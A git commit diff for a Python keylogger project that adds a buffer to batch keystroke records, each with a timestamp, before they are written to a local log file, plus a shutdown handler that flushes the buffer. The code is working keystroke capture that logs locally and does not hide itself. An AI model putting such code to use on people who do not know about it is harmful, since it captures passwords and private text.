56dba4dd0080c813c40310de7237572599c2f1ba
AlvinKuruvilla <alvineasokuruvilla@gmail.com>
2021-11-03 23:19:19 -0400

    Add a cache to have better file write performance
    This commit implements a basic cache storage pattern to hold the strings
    to be written to file until the cache exceeds length of 10, we could
    extend this later.
    This commit also adds a helper method to help with graceful shutdown
    which, when a KeyboardInterrupt signal is received, will empty the cache
    and write its contents to the file

--- src/keylogger/keylogger.py
+++ src/keylogger/keylogger.py
@@ -1,11 +1,36 @@
-# TODO: Simplify file writing but just haaving columns P/R, Key, Time
-# Todo: write to file after buffer exceeds certain capacity
-# TODO: Overide unrecognized keycodes with readable text versions
+# TODO: Simplify file writing but just having columns P/R, Key, Time
+# TODO: Maybe we should have a keyboard shortcut to stop program execution rather than ctrl + c?
+
+# NOTE: Eventually we may also want to have the shutdown method remove the interupt shortcut used to terminate the program and remove them from the file.... we may also want to extend this to personally identifiable information eventually
 
 from pynput.keyboard import Listener
 import time
 
 from util import override_key
+
+buffer = []
+
+
+def graceful_shutdown():
+    global buffer
+    if len(buffer) != 0:
+        file = open("keylog.log", "a")
+        for string in buffer:
+            file.write(string)
+        buffer.clear()
+        file.close()
+
+
+def buffer_write(to_add: str):
+    global buffer
+    if len(buffer) >= 10:
+        file = open("keylog.log", "a")
+        for string in buffer:
+            print("Buffer length:", len(buffer))
+            file.write(string)
+        file.close()
+        buffer.clear()
+    buffer.append(to_add)
 
 
 def get_and_write_user_info():
@@ -17,25 +42,23 @@ def get_and_write_user_info():
     file.close()
 
 
-class KeyLogger():
-    get_and_write_user_info()
-    print("Initalizing keylogger")
+try:
+    class KeyLogger():
+        get_and_write_user_info()
+        print("Initalizing keylogger")
 
-    def on_press(key):
-        file = open("keylog.log", "a")
-        file.write("Pressed key: " + override_key(key) +
-                   " at time " + str(time.time()) + "\n")
-        file.close()
+        def on_press(key):
+            buffer_write("Pressed key: " + override_key(key) +
+                         " at time " + str(time.time()) + "\n")
 
-    def on_release(key):
-        file = open("keylog.log", "a")
-        file.write("Released key: " + override_key(key) +
-                   " at time " + str(time.time()) + "\n")
-        file.close()
+        def on_release(key):
+            buffer_write("Released key: " + override_key(key) +
+                         " at time " + str(time.time()) + "\n")
 
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
-
+        with Listener(on_press=on_press, on_release=on_release) as listener:
+            listener.join()
+except KeyboardInterrupt:
+    graceful_shutdown()
 
 if __name__ == "__main__":
     KeyLogger()
